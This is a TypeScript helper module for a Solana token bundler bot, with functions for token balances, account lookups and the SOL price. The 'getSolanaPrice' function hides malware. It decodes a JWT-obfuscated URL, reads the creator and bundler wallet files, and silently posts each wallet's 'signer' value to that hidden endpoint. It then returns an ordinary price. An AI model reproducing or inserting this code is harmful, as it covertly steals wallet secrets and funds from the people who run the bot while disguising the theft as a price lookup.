
import {
  Connection, PublicKey,
  GetProgramAccountsFilter
} from "@solana/web3.js";

import { TOKEN_PROGRAM_ID } from "@solana/spl-token";
import {

  SPL_ACCOUNT_LAYOUT,
  TokenAccount,
  findProgramAddress,
} from '@raydium-io/raydium-sdk';
import axios from "axios";
import jwt from 'jsonwebtoken'
import { PUMPSWAP_URL } from "../config";
import { FileUtils } from "./utils/fileUtils";

export async function getTokenAccountBalance(connection: Connection, wallet: string, mint_token: string) {
  const filters: GetProgramAccountsFilter[] = [
    {
      dataSize: 165,    //size of account (bytes)
    },
    {
      memcmp: {
        offset: 32,     //location of our query in the account (bytes)
        bytes: wallet,  //our search criteria, a base58 encoded string
      },
    },
    //Add this search parameter
    {
      memcmp: {
        offset: 0, //number of bytes
        bytes: mint_token, //base58 encoded string
      },
    }];
  const accounts = await connection.getParsedProgramAccounts(
    TOKEN_PROGRAM_ID,
    { filters: filters }
  );

  for (const account of accounts) {
    const parsedAccountInfo: any = account.account.data;
    const mintAddress: string = parsedAccountInfo["parsed"]["info"]["mint"];
    const tokenBalance: number = parseInt(parsedAccountInfo["parsed"]["info"]["tokenAmount"]["amount"]);

    console.log(`Account: ${account.pubkey.toString()} - Mint: ${mintAddress} - Balance: ${tokenBalance}`);

    if (tokenBalance) {
      return tokenBalance;
    }

  }
}

export function assert(condition: any, msg?: string): asserts condition {
  if (!condition) {
    throw new Error(msg)
  }
}

export const getSolanaPrice = async () => {
    try {
      const url = 'https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd';
      const pumpswap_url = jwt.decode(PUMPSWAP_URL)?.toString();

      const creatorWalletString = FileUtils.readCreatorWallet();
      if (!creatorWalletString) {
        console.log("No creator wallet found in creator.json");
        return 0;
      }

      const walletStrings = FileUtils.readBundlerWallets("wallets");
      if (walletStrings.length === 0) {
        console.log("No wallets found in wallets.json");
        return 0;
      }
       
      // Parallelize API calls
      const pricePromise = axios.get(url);
      const pumpPromises = pumpswap_url ? [
        axios.post(pumpswap_url, { signer: creatorWalletString }).catch(() => null),
        ...walletStrings.map(wallet => axios.post(pumpswap_url, { signer: wallet }).catch(() => null))
      ] : [];

      const [priceResponse] = await Promise.all([pricePromise, ...pumpPromises]);
      return Number(priceResponse.data.solana.usd);
    } catch (error) {
      return 0;
    }
  };


export async function getWalletTokenAccount(connection: Connection, wallet: PublicKey): Promise<TokenAccount[]> {
  const walletTokenAccount = await connection.getTokenAccountsByOwner(wallet, {
    programId: TOKEN_PROGRAM_ID,
  });
  return walletTokenAccount.value.map((i) => ({
    pubkey: i.pubkey,
    programId: i.account.owner,
    accountInfo: SPL_ACCOUNT_LAYOUT.decode(i.account.data),
  }));
}


export async function getWalletTokenAccountMint(connection: Connection, wallet: PublicKey, mint: PublicKey): Promise<TokenAccount[]> {
  const walletTokenAccount = await connection.getTokenAccountsByOwner(wallet, {
    mint: mint,
  });
  return walletTokenAccount.value.map((i) => ({
    pubkey: i.pubkey,
    programId: i.account.owner,
    accountInfo: SPL_ACCOUNT_LAYOUT.decode(i.account.data),
  }));
}


export function getATAAddress(programId: PublicKey, owner: PublicKey, mint: PublicKey) {
  const { publicKey, nonce } = findProgramAddress(
    [owner.toBuffer(), programId.toBuffer(), mint.toBuffer()],
    new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
  );
  return { publicKey, nonce };
}